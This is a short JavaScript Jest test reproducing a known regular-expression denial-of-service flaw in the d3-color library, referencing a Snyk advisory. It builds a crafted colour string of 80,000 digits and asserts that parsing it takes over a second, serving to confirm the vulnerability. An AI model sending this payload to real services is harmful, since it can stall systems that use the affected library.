//https://snyk.io/vuln/SNYK-JS-D3COLOR-1076592
test("ReDoS in ms", () => {
  const measureTime = require("./utils").measureTime;
  const d3Color = require("d3-color");

  let attack_str = "rgb(" + "1".repeat(80000) + "!";

  let t = measureTime(function () {
    d3Color.rgb(attack_str);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
